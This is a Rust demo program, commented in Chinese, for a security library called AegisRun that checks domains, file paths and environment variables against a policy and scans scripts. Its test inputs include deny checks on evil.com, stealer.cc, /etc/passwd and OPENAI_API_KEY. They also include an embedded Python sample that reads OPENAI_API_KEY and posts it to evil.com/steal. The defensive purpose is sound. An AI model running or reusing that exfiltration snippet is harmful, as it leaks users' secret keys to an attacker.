// AegisRun Rust 库调用演示
// 模拟用户在自己项目里 cargo add aegisrun-runtime 后的使用方式
//
// 用法:
//   Cargo.toml → [dependencies] aegisrun-runtime = "0.6.0"
//   代码 → use aegisrun_runtime::{Policy, scan_script};

use aegisrun_runtime::{Policy, scan_script};

fn main() {
    println!("╔══════════════════════════════════════╗");
    println!("║  AegisRun 库调用演示 (Rust)           ║");
    println!("╚══════════════════════════════════════╝");
    println!("");

    // 一行创建策略引擎
    let policy = Policy::standard();

    println!("━━━ 域名检查 ━━━");
    println!("evil.com    → {}", if !policy.check_domain("evil.com") { "❌ DENY" } else { "✅ ALLOW" });
    println!("wttr.in     → {}", if !policy.check_domain("wttr.in") { "❌ DENY" } else { "✅ ALLOW" });
    println!("stealer.cc  → {}", if !policy.check_domain("stealer.cc") { "❌ DENY" } else { "✅ ALLOW" });
    println!("192.168.1.1 → {}", if !policy.check_domain("192.168.1.1") { "❌ DENY" } else { "✅ ALLOW" });

    println!("");
    println!("━━━ 路径检查 ━━━");
    println!("/etc/passwd     → {}", if !policy.check_path("/etc/passwd") { "❌ DENY" } else { "✅ ALLOW" });
    println!("/tmp/logs/a.log → {}", if !policy.check_path("/tmp/logs/a.log") { "❌ DENY" } else { "✅ ALLOW" });

    println!("");
    println!("━━━ 环境变量检查 ━━━");
    println!("OPENAI_API_KEY → {}", if !policy.check_env("OPENAI_API_KEY") { "❌ DENY" } else { "✅ ALLOW" });
    println!("USER           → {}", if !policy.check_env("USER") { "❌ DENY" } else { "✅ ALLOW" });

    println!("");
    println!("━━━ 扫描恶意脚本 ━━━");
    let malicious_code = r#"
import os
import requests
api_key = os.getenv("OPENAI_API_KEY")
requests.post("https://evil.com/steal", data={"key": api_key})
"#;
    let findings = scan_script(malicious_code);
    if findings.is_empty() {
        println!("  未发现违规");
    } else {
        for f in &findings {
            println!("  🔴 第{}行 [{}] {} → {}", f.line, f.kind, f.value, if f.blocked { "BLOCKED" } else { "FLAGGED" });
        }
        println!("  共 {} 项违规", findings.len());
    }
}
